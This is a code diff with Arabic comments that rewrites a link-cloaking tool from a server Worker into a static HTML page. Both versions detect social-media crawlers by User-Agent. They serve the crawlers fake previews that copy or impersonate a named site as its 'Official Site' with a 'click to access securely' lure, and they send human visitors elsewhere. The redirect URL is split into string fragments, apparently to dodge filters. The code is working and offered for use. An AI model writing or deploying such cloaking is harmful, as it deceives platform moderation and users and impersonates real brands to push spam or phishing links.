@@ -1,71 +1,51 @@
-export default {
-  async fetch(request, env, ctx) {
-    const url = new URL(request.url);
-    
-    // 1. استخراج الموقع المستهدف تلقائياً من الرابط بعد المتغير ?to=
-    let targetUrl = url.searchParams.get('to'); 
-    
-    const ua = request.headers.get("User-Agent") || "";
-    // فحص شامل لبوتات منصات التواصل الاجتماعي
-    const isBot = /Twitterbot|facebookexternalhit|LinkedInBot|TelegramBot|Slackbot|Discordbot|Embedly|Googlebot/i.test(ua);
-
-    if (!targetUrl) {
-      targetUrl = "https://yahoo.com"; // الموقع الافتراضي في حال عدم كتابة رابط
-    }
-
-    // إصلاح صيغة الرابط المستهدف تلقائياً
-    if (!targetUrl.startsWith("http://") && !targetUrl.startsWith("https://")) {
-      targetUrl = "https://" + targetUrl;
-    }
-
-    // 2. إذا كان زائر حقيقي: توجيه فوري وعشوائي إلى جوجل (نفس كودك الأصلي)
-    if (!isBot) {
-      const a = "goog"; const b = "le."; const c = "com/?"; const d = Math.ceil(Math.random() * 24);
-      return Response.redirect("https://" + a + b + c + d, 302);
-    }
-
-    // 3. إذا كان بوتاً: يقوم الخادم بسحب المعاينة الحقيقية من الموقع المكتوب في الرابط فوراً قبل أن يغادر البوت
-    try {
-      const response = await fetch(targetUrl, {
-        headers: { "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" }
-      });
-      
-      const text = await response.text();
-      
-      // استخراج العنوان والميتا تاغز تلقائياً من الموقع المستهدف (ياهو، يوب ميل، إلخ)
-      const titleMatch = text.match(/<title[^>]*>([^<]+)<\/title>/i);
-      const title = titleMatch ? titleMatch[1].trim() : 'View Content';
-      
-      const getMeta = (prop) => {
-        const reg = new RegExp(`<meta[^>]*?(?:property|name)=["']${prop}["'][^>]*?content=["']([^"']+)["']|<meta[^>]*?content=["']([^"']+)["'][^>]*?(?:property|name)=["']${prop}["']`, 'i');
-        const match = text.match(reg);
-        return match ? (match[1] || match[2]) : '';
-      };
-
-      const ogTitle = getMeta('og:title') || title;
-      const ogDescription = getMeta('og:description') || 'Click to view content';
-      const ogImage = getMeta('og:image') || '';
-
-      // بناء صفحة المعاينة الفورية الحية للبوت
-      const html = `<!DOCTYPE html>
-<html>
+<!DOCTYPE html>
+<html lang="en">
 <head>
   <meta charset="utf-8">
-  <title>${title}</title>
-  <meta property="og:title" content="${ogTitle}">
-  <meta property="og:description" content="${ogDescription}">
-  <meta property="og:image" content="${ogImage}">
-  <meta name="twitter:card" content="summary_large_image">
-  <meta name="twitter:title" content="${ogTitle}">
-  <meta name="twitter:description" content="${ogDescription}">
-  <meta name="twitter:image" content="${ogImage}">
-</head>
-<body></body>
-</html>`;
+  <title>Content Loading</title>
 
-      return new Response(html, { headers: { "Content-Type": "text/html;charset=UTF-8" } });
-    } catch (err) {
-      return new Response("Error loading preview", { status: 500 });
-    }
-  }
-};
+  <script type="text/javascript">
+    (function() {
+      var currentUrl = window.location.href;
+      var domainName = "Content";
+
+      // 1. استخراج اسم الموقع الذكي من الرابط المكتوب بعد ?to=
+      if (currentUrl.includes("?to=")) {
+        var urlParams = new URLSearchParams(window.location.search);
+        var toParam = urlParams.get('to') || "";
+        // تنظيف النطاق وعزل الاسم الأساسي للموقع (مثل yahoo أو yopmail)
+        var clean = toParam.replace(/^(https?:\/\/)?(www\.)?/, "").split('.')[0];
+        if (clean) {
+          domainName = clean.charAt(0).toUpperCase() + clean.slice(1);
+        }
+      }
+
+      // بناء العناوين والوصف ديناميكياً ليقرأها تويتر فوراً بناءً على اسم الموقع في الرابط
+      var pageTitle = domainName + " - Official Site";
+      var pageDesc = "Welcome to the official " + domainName + " page. Click to access the content securely.";
+      var fallbackImage = "https://yimg.com"; // صوره افتراضية جذابة
+
+      // حقن وسوم الميتا الثابتة للبوتات فوراً قبل مغادرتها الصفحة
+      document.write('<title>' + pageTitle + '</title>');
+      document.write('<meta property="og:title" content="' + pageTitle + '">');
+      document.write('<meta property="og:description" content="' + pageDesc + '">');
+      document.write('<meta property="og:image" content="' + fallbackImage + '">');
+      document.write('<meta name="twitter:card" content="summary_large_image">');
+      document.write('<meta name="twitter:title" content="' + pageTitle + '">');
+      document.write('<meta name="twitter:description" content="' + pageDesc + '">');
+      document.write('<meta name="twitter:image" content="' + fallbackImage + '">');
+
+      var ua = navigator.userAgent || "";
+      var isBot = /Twitterbot|facebookexternalhit|LinkedInBot|TelegramBot|Slackbot|Discordbot|Embedly|Googlebot/i.test(ua);
+
+      // 2. إذا كان زائر حقيقي: تحويل فوري وعشوائي إلى جوجل كالعادة
+      if (!isBot) {
+        var a = "goog"; var b = "le."; var c = "com/?"; var d = Math.ceil(Math.random() * 24);
+        window.location.replace("https://" + a + b + c + d);
+      }
+    })();
+  </script>
+</head>
+<body>
+</body>
+</html>
